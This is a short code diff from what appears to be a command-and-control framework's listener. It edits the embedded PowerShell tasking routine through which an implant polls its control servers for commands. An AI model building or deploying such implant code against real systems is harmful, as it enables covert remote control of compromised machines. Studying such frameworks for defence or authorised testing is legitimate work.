@@ -795,9 +795,10 @@ class Listener:
 
                 getTask = """
                     $script:GetTask = {
-
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
                         try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                            if ($ControlServers[$Script:ServerIndex].StartsWith("http")) {
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
